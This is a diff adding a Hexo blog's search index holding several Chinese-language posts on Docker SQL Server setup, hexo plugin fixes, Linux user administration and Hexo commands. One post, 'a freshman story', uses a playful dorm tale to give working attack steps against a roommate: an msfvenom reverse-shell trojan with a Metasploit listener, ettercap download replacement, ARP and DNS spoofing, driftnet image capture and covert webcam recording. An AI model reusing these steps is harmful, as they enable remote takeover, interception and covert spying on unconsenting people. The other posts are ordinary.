@@ -1,0 +1,884 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>mac安装sqlserver</title>
+      <link href="/2020/08/17/mac%E5%AE%89%E8%A3%85sqlserver/"/>
+      <url>/2020/08/17/mac%E5%AE%89%E8%A3%85sqlserver/</url>
+      
+        <content type="html"><![CDATA[<p>mac安装sqlserver</p><p>本篇較為精簡，以下是本篇的小建議：</p><p>   1 聽過 Mac<br>   2 聽過 Terminal<br>   3 聽過 Docker<br>   4 聽過 DataBase<br><a id="more"></a></p><p></p><h1>一、安裝 Docker</h1><br>安裝方法有兩種，個人建議用 brew 最快。<p></p><p>1.1 安裝<br>1.1.1 從官方網站安裝</p><p>下載網址：<a href="https://store.docker.com/editions/community/docker-ce-desktop-mac" target="_blank" rel="noopener">https://store.docker.com/editions/community/docker-ce-desktop-mac</a></p><p>下載完雙擊下載的 .dmg 文件，然后将鲸鱼图标拖拽到 Application 文件夹即可<br><img src="https://dotblogsfile.blob.core.windows.net/user/incredible/c618f813-8e98-4651-94ba-f9030a5b9da9/1541855714_94078.png" alt=""></p><p>1.1.2 從 Homebrew 安裝</p><pre><code>$ brew cask install docker==&gt; Creating Caskroom at /usr/local/Caskroom==&gt; We&apos;ll set permissions properly so we won&apos;t need sudo in the futurePassword:          # 输入 macOS 密码==&gt; Satisfying dependencies==&gt; Downloading https://download.docker.com/mac/stable/21090/Docker.dmg######################################################################## 100.0%==&gt; Verifying checksum for Cask docker==&gt; Installing Cask docker==&gt; Moving App &apos;Docker.app&apos; to &apos;/Applications/Docker.app&apos;.&amp;#x1f37a;  docker was successfully installed!</code></pre><p>安裝好後就是啓動docker<br>从应用中找到 Docker 图标并点击运行。可能会询问 macOS 的登陆密码，输入即可。<br><img src="https://www.runoob.com/wp-content/uploads/2018/01/1515480613-7638-docker-app-in-apps.png" alt=""><br>等待頂部狀態欄中的鯨魚圖標溢滿，点击顶部状态栏中的鲸鱼图标会弹出操作菜单。<br><img src="https://www.runoob.com/wp-content/uploads/2018/01/1515480612-6026-whale-in-menu-bar.png" alt=""></p><h1 id="記憶體配置"><a href="#記憶體配置" class="headerlink" title="記憶體配置"></a>記憶體配置</h1><p>SQL Server 最低需求配置為 3.25 GB，</p><p>因此我們需要增加容器配置的記憶體。</p><p>選擇 Preferences…<br><img src="https://dotblogsfile.blob.core.windows.net/user/incredible/c618f813-8e98-4651-94ba-f9030a5b9da9/1541908711_42496.png" alt=""><br>切換到 Advanced，將 Memory 增加至 4GB。</p><h1 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h1><p>鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是网易的镜像地址：<a href="http://hub-mirror.c.163.com。" target="_blank" rel="noopener">http://hub-mirror.c.163.com。</a></p><p>在任务栏点击 Docker for mac 应用图标 -&gt; Perferences… -&gt; Daemon -&gt; Registry mirrors。在列表中填写加速器地址即可。修改完成之后，点击 Apply &amp; Restart 按钮，Docker 就会重启并应用配置的镜像地址了。</p><h1 id="下載映像檔"><a href="#下載映像檔" class="headerlink" title="下載映像檔"></a>下載映像檔</h1><p>拉取 SQL Server 2017 Docker 镜像</p><pre><code>docker pull microsoft/mssql-server-linux:2017-latest</code></pre><h1 id="運行Docker鏡像"><a href="#運行Docker鏡像" class="headerlink" title="運行Docker鏡像"></a>運行Docker鏡像</h1><pre><code>docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;MSSQL_SA_PASSWORD=您的密码&apos; -p 1433:1433 --name sqlserver -d microsoft/mssql-server-linux:2017-latest</code></pre><p>參數說明<br>-e ‘MSSQL_SA_PASSWORD=您的密码’     设置SA用户的密码<br>-p 1433:1433     映射端口<br>–name sqlserver     设置Docker容器名称为sqlserver<br>-e “ACCEPT_EULA=Y”     将 ACCEPT_EULA 变量设置为任意值，以确认接受最终用户许可协议。 SQL Server 映像的必需设置。</p><p>檢查Docker容器運行情況</p><pre><code>docker ps docker ps -a (包含未運行的容器)</code></pre><p>更改SQLSERVER密碼</p><pre><code>docker exec -it sql1 /opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P &quot;您的密码&quot;   -Q &apos;ALTER LOGIN SA WITH PASSWORD=&quot;新密码&quot;&apos;</code></pre><h1 id="查看Images"><a href="#查看Images" class="headerlink" title="查看Images"></a>查看Images</h1><p>下載完畢後，利用 docker images 可以查看本地擁有的映像檔。</p><pre><code>docker images</code></pre><h1 id="關閉SQLSERVER"><a href="#關閉SQLSERVER" class="headerlink" title="關閉SQLSERVER"></a>關閉SQLSERVER</h1><pre><code>docker stop sqlserver(CONTAINER ID)</code></pre><h1 id="如果sqlserver沒有啓動，則需要啓動它"><a href="#如果sqlserver沒有啓動，則需要啓動它" class="headerlink" title="如果sqlserver沒有啓動，則需要啓動它"></a>如果sqlserver沒有啓動，則需要啓動它</h1><pre><code>docker start sqlserver(CONTAINER ID)</code></pre><p>如果想要刪除容器，請記得先停止容器！</p><p>利用 docker rm 指令，就可以刪除。</p><pre><code>docker rm sql_server_demo</code></pre><p>如何刪除映像檔</p><pre><code>docker rmi microsoft/mssql-server-linux    </code></pre><p>鏈接到SQLSERVER<br>在sqlserver容器中打開BASH終端</p><pre><code>docker exec -it sqlserver &quot;bash&quot;</code></pre><p>在sqlserver容器的BASH終端中輸入</p><pre><code>/opt/mssql-tools/bin/sqlcmd -S localhost -U SA -P &quot;您的密码&quot;</code></pre><p></p><h1>二、安裝圖形化鏈接工具</h1><br>我們一般會使用可視化管理工具去鏈接SQLSERVER，這裏我們安裝DBeaver<br>DBeaver 是 Mac 平台上一款免费通用的数据库工具，允许您查看数据库的结构，执行 SQL 查询和脚本，浏览和导出表数据，处理 BLOB / CLOB 值，修改数据库元对象等。<br>下載安裝包<a href="https://dbeaver.io/files/dbeaver-ce-latest-macos.dmg" target="_blank" rel="noopener">https://dbeaver.io/files/dbeaver-ce-latest-macos.dmg</a><br>安裝步驟跟docker一樣，可參考上面docker安裝。<br>在Application中雙擊圖標啓動DBeaver會提示下載驅動，按照所需下載即可。<br><img src="https://dotblogsfile.blob.core.windows.net/user/incredible/c618f813-8e98-4651-94ba-f9030a5b9da9/1541914550_56774.png" alt=""><br>還有一種免費的圖形化工具SQL Operations Studio<br>下載地址：<a href="https://docs.microsoft.com/zh-tw/sql/azure-data-studio/download?view=sql-server-2017" target="_blank" rel="noopener">https://docs.microsoft.com/zh-tw/sql/azure-data-studio/download?view=sql-server-2017</a><p></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> MAC </tag>
+            
+            <tag> SQLSERVER </tag>
+            
+            <tag> Docker </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hexo豆瓣卡片安裝遇到的坑</title>
+      <link href="/2020/08/03/hexo%E8%B1%86%E7%93%A3%E5%8D%A1%E7%89%87%E5%AE%89%E8%A3%9D%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
+      <url>/2020/08/03/hexo%E8%B1%86%E7%93%A3%E5%8D%A1%E7%89%87%E5%AE%89%E8%A3%9D%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
+      
+        <content type="html"><![CDATA[<p>hexo豆瓣卡片安裝遇到的坑<br>軟件升級版本前<br>系統版本：Ubuntu 18.04.1<br>node版本： v8.10.0<br>npm版本：  v3.5.2<br><a id="more"></a><br>安裝豆瓣卡片</p><pre><code>sudo npm install hexo-douban-card --save</code></pre><p>提示webpack警告<br>所以安裝webpack</p><pre><code>sudo  npm install webpack@^4.4.0 --save</code></pre><p>WARN engine <a href="mailto:semver@7.3.2" target="_blank" rel="noopener">semver@7.3.2</a>: wanted: {“node”:”&gt;=10”} (current: {“node”:”8.10.0”,”npm”:”3.5.2”loadDep:fsevents          ▐ ╢████████████████████████████████░<br>調試發現還是有報錯</p><pre><code>sudo npm install hexo-douban-card --savehexo --debug</code></pre><p>看了大概好像是權限的問題，SO給這個文件夾一樣的權限</p><pre><code>ll hexo-douban-cardsudo chown -R  max.max hexo-douban-card/ll hexo-douban-card</code></pre><p>調試發現居然沒報錯了</p><pre><code>hexo --debug </code></pre><p>那趕緊發佈文章看看</p><pre><code>hexo n &quot;xxx&quot;hexo ghexo s</code></pre><p>嗯，正常了！！<br>但是我想多了，就在我想再發佈一篇文章時，又報錯了，這次又是不一樣的錯誤！（錯誤沒複製到，就把框關掉了。無法復現了）<br>所以我只能卸載</p><pre><code>sudo npm uninstall hexo-douban-card --save</code></pre><p>我嘗試了一下不安裝devDependencies 里面的包看看</p><pre><code>sudo npm install --production</code></pre><p>解析</p><pre><code>npm install will install both “dependencies” and “devDependencies“npm install –production will only install “dependencies“npm install –dev will only install “devDependencies“</code></pre><p>升級npm</p><pre><code>sudo npm install -g nsudo n stable</code></pre><p>配置環境變量</p><pre><code>export PATH=/usr/local/bin/node:$PATHexport </code></pre><p>查看版本</p><pre><code>#node -vv12.18.3#npm -vv8.10.0</code></pre><p>重新安裝hexo-douban-card</p><pre><code>sudo npm install hexo-douban-card --savehexo g -w</code></pre><p>報錯。。。。。<br>Template render error: (unknown path) [Line 3, Column 25]<br>unknown block tag: dplayer<br>嗯，應該是dplayer插件的問題<br>點開插件列表，發現少了dplayer 插件，SO安裝它</p><pre><code>sudo npm install hexo-tag-dplayer</code></pre><p>重新生成</p><pre><code>hexo g -w</code></pre><p>NICE,沒有報錯了，繼續發佈，也正常，網頁雲可以正常訪問！！！！總算救回來了。。。。。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+            <tag> npm </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux系統日常運維管理</title>
+      <link href="/2020/08/02/Linux%E7%B3%BB%E7%B5%B1%E6%97%A5%E5%B8%B8%E9%81%8B%E7%B6%AD%E7%AE%A1%E7%90%86/"/>
+      <url>/2020/08/02/Linux%E7%B3%BB%E7%B5%B1%E6%97%A5%E5%B8%B8%E9%81%8B%E7%B6%AD%E7%AE%A1%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<p>Linux系统日常运维管理<br> </p><h1>Linux用户管理</h1><br>1.1 基于命令行管理工具<br><a id="more"></a><br>1.useradd:建立用户<br>作用：用来建立用户账号和创建用户的起始目录。<br>用法：USERADD [选项] LOGIN<br>说明：增加用户账号就是在/etc/passwd文件中为新用户增加一条记录，同时更新其他系统文件。如/etc/shadow、/etc/group等。通常用passwd设定账号密码。<br>应用实例：<p></p><pre><code>#useradd –d /usr/ccn –m ccn –创建一个用户ccn ,登录名:ccn,并产生一个主目录/usr/ccn</code></pre><p>查看useradd命令的默认设置</p><pre><code>#useradd –D </code></pre><p>默认设置保存在文件/etc/default/useradd中</p><p>2.userdel:删除用户<br>实例:</p><pre><code>#userdel –r ccn ----把用户的主目录一起删除</code></pre><p>3.usermod:修改已有用户的信息<br>实例如下：</p><pre><code>#usermod –s /bin/tcsh –d /home/ccn –g developer ccn</code></pre><p>将用户ccn的登录shell修改为tcsh，主目录改为/home/ccn,用户组改为developer.</p><p>4.passwd:设置密码<br>作用：用来修改账号的登录密码<br>用法:passwd  [选项]  账号名称</p><p>5.chage:密码老化<br>用法：chage  [-l] 用户名<br>应用实例：<br>如果系统管理员想让用户ccn在首次登录时设置密码，用户的密码可以被设置为立即过期，从而强制用户在首次登录后立即改变他:</p><pre><code>#chage  d  0  ccn</code></pre><p>6.groupadd:添加组<br>使用权限：超级用户<br>用法：groupadd [选项] group<br>应用实例:</p><pre><code>#groupadd –g 744 ccn -----建立一个新组，并设置组ID加入系统</code></pre><p>7.groupdel:删除组账户<br>说明：groupdel命令无选项。删除一个已有的用户组账户，可以是使用该命令，但是该账户不能作为所有组被其他用户引用。<br>应用实例如下：<br>用户AB使用组账号CCN做其私有组时，不能直接删除组账号CCN，要先删除yon过户AB,再删除组账号CCN，命令如下：</p><pre><code>#userdel –r ab#groupdel ccn</code></pre><p>8.groupmod:修改组属性<br>用法：groupmod [] 用户组名<br>实例：<br>将GROUP1的组标识号修改为102</p><pre><code>#groupmod –g 102 group1</code></pre><p>9.vipw:编辑/etc/passwd文件</p><pre><code>用法:vipw</code></pre><p>10.vigr:编辑/etc/group文件</p><pre><code>用法：vigr</code></pre><p>11.newgrp:转化组</p><pre><code>作用：用来转化用户的当前组到指定的组账户，用户必须属于该组才能执行。用法：newgrp 要转化的用户组账号名</code></pre><p>说明：如果一个用户同时属于多个用户组，那么用户可以在用户组之间切换，以便具有其他用户的权限。用户可以在登录后，使用命令newgrp切换到其他用户组，这个命令的参数就是目的用户组。</p><p>12.groups: 显示组</p><pre><code>用法：groups 用户名</code></pre><p>13.gpasswd:添加组</p><pre><code>作用：用来添加用户到组用法：gpasswd [选项] group</code></pre><p>实例如下：<br>设定user1用户为user组管理员</p><pre><code>#gpasswd –A user1 user</code></pre><p>14.whoami:显示当前用户名称</p><pre><code>使用权限：所有用户</code></pre><p>15.who:显示登录用户</p><pre><code>作用：用来显示系统中有哪些用户登录系统及其修改信息。用法：who [选项] [记录文件</code></pre><p>16.id：显示用户信息</p><pre><code>作用：用来显示用户当前的GID.UID.用户所属组列表。用法：id [选项] [用户名称]</code></pre><p>17.su:切换身份</p><pre><code>用法：su [选项] – [用户 [参数]..]</code></pre><p>实例:</p><pre><code>#su –c /root/bin/w3bak webadmin root</code></pre><p>该命令使超级用户转化成一般使用者webadmin，并执行/root/bin/w3bak这个shell脚本，然后恢复超级用户<br>18.pwck:检测账户</p><pre><code>作用：用于检测用户账号信息的完整性。用法：pwck [-q][-r][-s] [passwd [shadow]]说明：pwck命令检测文件/etc/passwd 和 /etc/shadow的每一行字段的用法和数值是否正确。</code></pre><p>实例：</p><pre><code>#pwck  /etc/passwd  --验证存在于用户数据库中的所有用户和管理员，并报告（但不修正）任何错误</code></pre><p>19.grpck:检测用户组账号信息的完整性<br>20.chsh:设置shell</p><pre><code>使用权限：所有使用者用法：chsh [-s shell][--list-shell][--help][--version] 用户名称</code></pre><p>21.chfn:修改用户信息</p><pre><code>用法：chfn [-f full-name][-o ofice][-p office-phone][-h home-phone][-u][-v] 用户名称修改后的内容存放在/etc/passwd文件中</code></pre><p>22.ac显示用户在线时间的统计信息</p><pre><code>用法：ac</code></pre><p>实例：<br>显示所有用户登录时间</p><pre><code>#ac –p</code></pre><p>显示所有ccn登录时间（包括年份）</p><pre><code>#ac  –d  –y  –p  ccn</code></pre><p>23.grpconv:开启群组的投影密码<br>说明：Linux系统里的用户和群组密码，分别存放在/etc目录下的passwd 和group文件中。因系统运作所需，任何人都可以读取他们，造成安全上的破绽。投影密码将文件内的密码改存在/etc目录下的shadow和gshadow文件内，只允许系统管理者读取，同时把原密码换成x字符。<br>24.grpunconv:关闭群组的投影密码<br>25.lastlog:显示最近登录用户的用户名、登录端口和登录时间</p><pre><code>用法：lastlog [选项]</code></pre><p>26.logname:显示当前用户的名称<br>27.users：显示当前登录到系统的用户<br>28.lastb:显示登录系统失败用户的相关信息<br>说明：单独执行lastb指令，它会读取位于/var/log目录下btmp的文件，并把该文件内容列出。<br>实例：<br>显示最近5个登录失败记录</p><pre><code>#lastb  –n  5</code></pre><p>显示2016-12-12前的最近3个登录失败记录</p><pre><code>#lastb  –c  20161212000000  –n  3</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+            <tag> 运維 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>a freshman story</title>
+      <link href="/2020/07/28/a-freshman-story/"/>
+      <url>/2020/07/28/a-freshman-story/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>一個夜黑風高的夜晚</h1><br>呢個故仔純屬虛構,如果有同樣嘅情況純屬巧合。<br>這是發生在一個夜黑風高的宿舍裏面的小插曲。<br><a id="more"></a><br>這天，只有CN和小胖两个在宿舍。小胖还是跟往常一样坐在自己的位子上浏览着他喜欢的小说。而CN呢就在看着自己的黑客教程视频。突然CN回头看了一眼小胖后嘴角微微上扬，然后CN在KALI上敲了段代码<p></p><pre><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=192.168.*.* LPORT=55555 -f exe &gt; test.exe 。(生成木马test.exe)</code></pre><p>接着CN打开msfconsole，设置本机监听,因为之前生成攻击文件用的是 reverse_tcp ,所以设置如下</p><pre><code>命令: msf &gt; use exploit/multi/handlerMsf exploit(handler) &gt; set payload windows/meterpreter/reverset_tcp</code></pre><h1 id="设置LHOST（ip）-LPORT（端口）-并执行-exploit"><a href="#设置LHOST（ip）-LPORT（端口）-并执行-exploit" class="headerlink" title="设置LHOST（ip）,LPORT（端口）,并执行 exploit"></a>设置LHOST（ip）,LPORT（端口）,并执行 exploit</h1><pre><code>msf exploit(handler) &gt; set LHOST 192.168.*.*.msf exploit(handler) &gt; set LPORT 55555msf exploit(handler) &gt; show options (查看LHOST ,LPORT 设置好没) msf exploit(handler) &gt; exploit </code></pre><h1 id="为了让小胖上当，CN首先开启ettercap准备进行中间人攻击（新建一个规则）"><a href="#为了让小胖上当，CN首先开启ettercap准备进行中间人攻击（新建一个规则）" class="headerlink" title="为了让小胖上当，CN首先开启ettercap准备进行中间人攻击（新建一个规则）"></a>为了让小胖上当，CN首先开启ettercap准备进行中间人攻击（新建一个规则）</h1><p><img src="/2020/07/28/a-freshman-story/webwxgetmsgimg3.jpg" alt=""><br><img src="/2020/07/28/a-freshman-story/webwxgetmsgimg2.jpg" alt=""><br><img src="/2020/07/28/a-freshman-story/webwxgetmsgimg.jpg" alt=""></p><h1 id="最后编译下"><a href="#最后编译下" class="headerlink" title="最后编译下"></a>最后编译下</h1><pre><code>Etterfilter exe.filter –o exe.ef</code></pre><h1 id="然后进行欺骗"><a href="#然后进行欺骗" class="headerlink" title="然后进行欺骗"></a>然后进行欺骗</h1><pre><code>Ettercap –T –q –i  eth0 –F exe.ef –M ARP /// /// -P autoadd</code></pre><p>当小胖不管下载什么东西的时候都会替换成我们的木马进行下载，他只要运行后我们就可以获取权限了（当然木马首先得是免杀）<br>可是小胖只是在看他的小说呀，他又不会去下载什么东西。那怎么办呢?只见CN突然跑到小胖跟前说发现了一个可以送很多装备的CS安装包，小胖听后很是开心，就嚷嚷着快帮他下载。只见CN敲了几下键盘，软件就下好了。确认下好后CN就回到自己位置上了，说让小胖自行去点击安装。<br><img src="/2020/07/28/a-freshman-story/psbA3LWJ6H8.jpg" alt=""><br>不一会，小胖就点了CN的木马。“啊，没反应啊？”小胖突然叫了起来。这时在CN正儿八经的胡说八道之下小胖居然相信了，沒有往下深究了又乖乖地看他的小说了。</p><h1 id="嗯，肉雞上線了，那要乾點什麼呢？先查看下系統信息，嗯，win7-sp1的"><a href="#嗯，肉雞上線了，那要乾點什麼呢？先查看下系統信息，嗯，win7-sp1的" class="headerlink" title="嗯，肉雞上線了，那要乾點什麼呢？先查看下系統信息，嗯，win7 sp1的"></a>嗯，肉雞上線了，那要乾點什麼呢？先查看下系統信息，嗯，win7 sp1的</h1><p><img src="/2020/07/28/a-freshman-story/psb7AZEID24.jpg" alt=""></p><h1 id="再來获取shell"><a href="#再來获取shell" class="headerlink" title="再來获取shell"></a>再來获取shell</h1><p><img src="/2020/07/28/a-freshman-story/psb2M076BR0.jpg" alt=""><br>CN突然陷入了短暂的沉思中，缓过神后，CN想看看小胖现在有没有浏览图片</p><h1 id="检查端口转发是否启用。"><a href="#检查端口转发是否启用。" class="headerlink" title="检查端口转发是否启用。"></a>检查端口转发是否启用。</h1><pre><code>cat /proc/sys/net/ipv4/ip_forward</code></pre><p>如果结果为0则表示其关闭。</p><h1 id="启用命令："><a href="#启用命令：" class="headerlink" title="启用命令："></a>启用命令：</h1><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><p>然后在目标计算机中进行ARP欺骗。</p><h1 id="输入命令："><a href="#输入命令：" class="headerlink" title="输入命令："></a>输入命令：</h1><pre><code>arpspoof -i eth0 -t 192.168.1.2 192.168.1.129</code></pre><p>由于在目标计算机中启用了ARP欺骗。现在就是Driftnet大展身手的时候了。</p><h1 id="开启了DRIFTNET抓图"><a href="#开启了DRIFTNET抓图" class="headerlink" title="开启了DRIFTNET抓图"></a>开启了DRIFTNET抓图</h1><pre><code>driftnet -i eth0</code></pre><h1 id="哟？小胖居然在。。。。。。"><a href="#哟？小胖居然在。。。。。。" class="headerlink" title="哟？小胖居然在。。。。。。"></a>哟？小胖居然在。。。。。。</h1><p><img src="/2020/07/28/a-freshman-story/197.png" alt=""></p><h1 id="然后CN又产生了邪恶的想法，打开小胖的摄像头获取小胖的照片"><a href="#然后CN又产生了邪恶的想法，打开小胖的摄像头获取小胖的照片" class="headerlink" title="然后CN又产生了邪恶的想法，打开小胖的摄像头获取小胖的照片"></a>然后CN又产生了邪恶的想法，打开小胖的摄像头获取小胖的照片</h1><p><img src="/2020/07/28/a-freshman-story/psbGWTL86P2.jpg" alt=""></p><h1 id="获取了照片后，但远远不够满足CN，他要的是个摄像头录像"><a href="#获取了照片后，但远远不够满足CN，他要的是个摄像头录像" class="headerlink" title="获取了照片后，但远远不够满足CN，他要的是个摄像头录像"></a>获取了照片后，但远远不够满足CN，他要的是个摄像头录像</h1><p><img src="/2020/07/28/a-freshman-story/psbMFVA71T6.jpg" alt=""><br>CN满意的露出了笑容，但马上又陷入沉思，好像还有什么不满足<br>继续敲着键盘<br>开始编辑簡單的本地网页</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;hacker&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;This is the not what you want the webpage!!!!The web server is mine now 哈哈！！！！！　&lt;/body&gt;&lt;/html&gt;</code></pre><h1 id="編輯好網頁後編輯host-conf-把-com指向本機ip，我們用ettercap來進行dns欺騙，首先找到etter-dns這個配置文件並且編輯"><a href="#編輯好網頁後編輯host-conf-把-com指向本機ip，我們用ettercap來進行dns欺騙，首先找到etter-dns這個配置文件並且編輯" class="headerlink" title="編輯好網頁後編輯host.conf,把*.com指向本機ip，我們用ettercap來進行dns欺騙，首先找到etter.dns這個配置文件並且編輯"></a>編輯好網頁後編輯host.conf,把*.com指向本機ip，我們用ettercap來進行dns欺騙，首先找到etter.dns這個配置文件並且編輯</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Locate etter.dns</span><br><span class="line">Nano /usr/local/share/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>添加一条A记录，将 *.com 指向到本机IP<br>保存并且退出，使用ettercap开始欺骗<br><code>Ettercap  -T  -q  -P dns_spoof  -M arp:remote // //</code><br>小胖访问任意.com网站的时候。可以看到，目标主机对域名<a href="http://www.baidu.com的访问已经被指向到本机的网页" target="_blank" rel="noopener">www.baidu.com的访问已经被指向到本机的网页</a><br><img src="/2020/07/28/a-freshman-story/psbW31GYKZZ.jpg" alt=""></p><h3 id="本文記錄沒什麼技術含量，主要是爲了懷念一下大學的生活，還有對宿友二胖的想念（回想一下好像都有三年沒見了-ㄒoㄒ"><a href="#本文記錄沒什麼技術含量，主要是爲了懷念一下大學的生活，還有對宿友二胖的想念（回想一下好像都有三年沒見了-ㄒoㄒ" class="headerlink" title="本文記錄沒什麼技術含量，主要是爲了懷念一下大學的生活，還有對宿友二胖的想念（回想一下好像都有三年沒見了/(ㄒoㄒ)/~~)"></a>本文記錄沒什麼技術含量，主要是爲了懷念一下大學的生活，還有對宿友二胖的想念（回想一下好像都有三年沒見了/(ㄒoㄒ)/~~)</h3>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 生活 </tag>
+            
+            <tag> kali linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hexo_docs_commands</title>
+      <link href="/2020/07/28/hexo-docs-commands/"/>
+      <url>/2020/07/28/hexo-docs-commands/</url>
+      
+        <content type="html"><![CDATA[<h1>Hexo 指令</h1><h1 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h1><pre><code>npm install hexo-cli -g</code></pre><a id="more"></a><h1 id="新建一篇文章"><a href="#新建一篇文章" class="headerlink" title="新建一篇文章"></a>新建一篇文章</h1><pre><code>$ hexo new [layout] &lt;title&gt;（新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。）$ hexo new &quot;post title with whitespace&quot;</code></pre><h1 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h1><pre><code>$ hexo generate$ hexo generate -f (強制重新生成靜態文件)</code></pre><h1 id="发布草稿"><a href="#发布草稿" class="headerlink" title="发布草稿"></a>发布草稿</h1><pre><code>hexo publish [layout] &lt;filename&gt;</code></pre><h1 id="启动服务器。默认情况下，访问网址为：-http-localhost-4000"><a href="#启动服务器。默认情况下，访问网址为：-http-localhost-4000" class="headerlink" title="启动服务器。默认情况下，访问网址为： http://localhost:4000/"></a>启动服务器。默认情况下，访问网址为： <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></h1><pre><code>$ hexo server</code></pre><h1 id="发表草稿"><a href="#发表草稿" class="headerlink" title="发表草稿"></a>发表草稿</h1><pre><code>$ hexo publish [layout] &lt;filename&gt;</code></pre><h1 id="新建一个网站。如果没有设置-folder-，Hexo-默认在目前的文件夹建立网站"><a href="#新建一个网站。如果没有设置-folder-，Hexo-默认在目前的文件夹建立网站" class="headerlink" title="新建一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站"></a>新建一个网站。如果没有设置 folder ，Hexo 默认在目前的文件夹建立网站</h1><pre><code>$ hexo init [folder]</code></pre><h1 id="清除缓存文件-db-json-和已生成的静态文件-public"><a href="#清除缓存文件-db-json-和已生成的静态文件-public" class="headerlink" title="清除缓存文件 (db.json) 和已生成的静态文件 (public)"></a>清除缓存文件 (db.json) 和已生成的静态文件 (public)</h1><pre><code>$ hexo clean</code></pre><h1 id="列出网站资料"><a href="#列出网站资料" class="headerlink" title="列出网站资料"></a>列出网站资料</h1><pre><code>$ hexo list &lt;type&gt;</code></pre><h1 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h1><pre><code>$ hexo deploy</code></pre><h1 id="以上命令可以簡寫爲：hexo-n-hexo-g-hexo-s-hexo-d。-eg"><a href="#以上命令可以簡寫爲：hexo-n-hexo-g-hexo-s-hexo-d。-eg" class="headerlink" title="以上命令可以簡寫爲：hexo n,hexo g,hexo s,hexo d。 .eg"></a>以上命令可以簡寫爲：hexo n,hexo g,hexo s,hexo d。 .eg</h1><h1 id="更多命令詳情在官網地址獲取https-hexo-io-zh-cn-docs-commands"><a href="#更多命令詳情在官網地址獲取https-hexo-io-zh-cn-docs-commands" class="headerlink" title="更多命令詳情在官網地址獲取https://hexo.io/zh-cn/docs/commands"></a>更多命令詳情在官網地址獲取<a href="https://hexo.io/zh-cn/docs/commands" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/commands</a></h1><h1>hexo 託管到GitHub Pages</h1><h1 id="安裝Node-js"><a href="#安裝Node-js" class="headerlink" title="安裝Node.js"></a>安裝Node.js</h1><pre><code>wget https://nodejs.org/dist/v12.18.3/node-v12.18.3.tar.gz    // 下载tar -zxvf node-v12.18.3.tar.gz                                   // 解压cd node-v12.18.1-linux-x64                                              // 进入解压目录./configure                                                            //編譯make&amp;&amp;make install                                                  //安裝node -v                                                              //查看版本，以及驗證是否安裝成功npm install                                                            //安裝npmnpm install -g cnpm --registry=https://registry.npm.taobao.org          //因为npm比较慢，可以安装cnpm替代之后的npm命令</code></pre><h1 id="安裝GIT"><a href="#安裝GIT" class="headerlink" title="安裝GIT"></a>安裝GIT</h1><pre><code>yum -y install git                        //如果yum安裝git版本不是自己想要的，可以源碼安裝</code></pre><h1 id="创建Git仓库"><a href="#创建Git仓库" class="headerlink" title="创建Git仓库"></a>创建Git仓库</h1><p>打开GitHub，点击“New repository”，创建一个新仓库，用来专门存放博客日志信息；仓库名要按照格式：账户名.github.io，比如：Ccn.github.io；否则，后边的操作会出现问题；创建仓库时勾选上“Initialize this repository with a README”；进入创建好的仓库Mshrimp.github.io，点击右侧的“Settings”，向下拉找到Github Pages，会看到网站是：<a href="https://Ccn.github.io/，点击就可以访问，也可以通过外网访问，这时这个博客项目已经部署到网站上了，但是是个空的网站，没有内容；这个网址是博客的默认地址，如果有兴趣可以自己购买域名换成想要的地址。" target="_blank" rel="noopener">https://Ccn.github.io/，点击就可以访问，也可以通过外网访问，这时这个博客项目已经部署到网站上了，但是是个空的网站，没有内容；这个网址是博客的默认地址，如果有兴趣可以自己购买域名换成想要的地址。</a></p><pre><code>$ git config --global user.name &quot;Ccn&quot;$ git config --global user.email &quot;******@outlook.com&quot;            //配置GIT環境$ ssh-keygen -t rsa -C &quot;******@outlook.com&quot;       //使用ssh-keygen生成私钥和公钥$ ssh -T git@github.com                         //把本地公钥添加到github中；在GitHub中，点击右侧图像下拉选项，选择“Settings”，在“SSH and GPG keys”中，点击“New SSH key”，并将~/.ssh/id_rsa.pub文件里的内容复制上去，保存退出；使用“ssh -T git@github.com”命令，测试添加ssh是否成功；</code></pre><p>HexoBlog部署到git，需要安装hexo-deployer-git插件，在blog目录下运行以下命令进行安装；</p><pre><code>$ npm install hexo-deployer-git --save</code></pre><h1 id="在-config-yml（如果有已存在的请删除）添加如下配置："><a href="#在-config-yml（如果有已存在的请删除）添加如下配置：" class="headerlink" title="在 